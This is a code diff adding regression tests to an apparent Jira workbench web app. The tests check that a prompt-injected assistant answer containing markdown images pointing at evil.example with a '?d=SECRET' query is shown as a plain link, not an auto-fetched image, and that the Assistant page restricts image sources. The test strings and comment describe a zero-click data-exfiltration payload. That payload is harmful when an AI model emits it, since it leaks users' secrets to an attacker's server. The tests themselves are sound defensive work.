@@ -6409,6 +6409,43 @@ def test_post_assistant_escapes_html_looking_text_in_the_answer_instead_of_rende
     assert "&lt;script&gt;" in response.text
 
 
+def test_post_assistant_does_not_render_images_from_the_answer(tmp_path: Path, monkeypatch) -> None:
+    # Regression (#53 review): a prompt-injected answer containing
+    # ![x](https://evil/?d=SECRET) rendered as an <img>, so the browser
+    # fetched the attacker URL with no click.
+    monkeypatch.setattr(jira_workbench.server.threading, "Thread", _SyncThread)
+    answer = "Done. ![x](https://evil.example/?d=SECRET) and ![y][ref]\n\n[ref]: https://evil.example/ref"
+    monkeypatch.setattr(
+        jira_workbench.server,
+        "assistant_ask_streaming",
+        lambda engine, jira_dir, question, *, resume_id=None, on_step=None: AssistantResult(
+            engine=engine, answer=answer, error=None, session_id="sess-1", duration_seconds=1.0
+        ),
+    )
+    client = TestClient(create_app(tmp_path, WorkbenchConfig()))
+
+    post_response = client.post("/assistant", data={"engine": "claude", "question": "q"}, follow_redirects=False)
+    response = client.get(post_response.headers["location"])
+
+    assert "<img" not in response.text
+    assert '<a href="https://evil.example/?d=SECRET">x</a>' in response.text
+    assert response.headers["content-security-policy"] == "img-src 'self'"
+
+
+def test_assistant_page_sends_an_image_restricting_csp_but_other_pages_do_not(tmp_path: Path) -> None:
+    # Other pages show assignee avatars from Jira's avatar hosts, so the
+    # img-src restriction is scoped to the Assistant page.
+    client = TestClient(create_app(tmp_path, WorkbenchConfig()))
+
+    assistant = client.get("/assistant")
+    assert assistant.status_code == 200
+    assert assistant.headers["content-security-policy"] == "img-src 'self'"
+
+    index = client.get("/")
+    assert index.status_code == 200
+    assert "content-security-policy" not in index.headers
+
+
 def test_assistant_conversations_survive_a_server_restart(tmp_path: Path, monkeypatch) -> None:
     monkeypatch.setattr(jira_workbench.server.threading, "Thread", _SyncThread)
     monkeypatch.setattr(
